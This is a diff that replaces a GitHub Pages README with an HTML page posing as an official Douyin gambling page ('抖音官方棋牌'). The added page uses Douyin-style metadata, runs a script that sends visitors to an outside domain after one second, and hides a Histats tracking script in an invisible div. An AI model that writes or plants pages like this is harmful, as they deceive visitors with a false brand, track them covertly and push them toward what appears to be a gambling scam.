@@ -1,37 +1,37 @@
-## Welcome to GitHub Pages
-
-You can use the [editor on GitHub](https://github.com/bmvip/github.ii/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
-
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
-
-### Markdown
-
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/bmvip/github.ii/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<!DOCTYPE html>
+<html lang="en"><head>
+<script src="jquery.min.js"></script>
+<script>setTimeout(function(){self.location="http://a.yixiuba.cn/dy.html"},1000)</script>
+<meta charset="utf-8"><title>抖音官方棋牌</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,minimum-scale=1,maximum-scale=1,minimal-ui,viewport-fit=cover">
+<meta name="format-detection" content="telephone=no">
+<meta name="pathname" content="magic_activity">
+<meta name="description" content="抖音官方棋牌">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge;chrome=1">
+<meta name="aweme:title" content="抖音官方棋牌">
+<meta name="aweme:description" content="抖音官方棋牌">
+<meta name="aweme:image" content="https://6298v.cn/public/uploads/dddd1328ddd9a4b.jpg">
+<meta property="aweme:image:width" content="750">
+<meta property="aweme:image:height" content="1334">
+<meta name="aweme:url" content="http://a.yixiuba.cn/dy.html">
+<meta name="aweme:qrcode" content="">
+  
+</head>
+<body>
+<div style="display:none">
+<script type="text/javascript">
+var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4306787,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();
+</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4306787&101" alt="" border="0"></a></noscript>
+</div>
+</body></html><div id="app"></div>
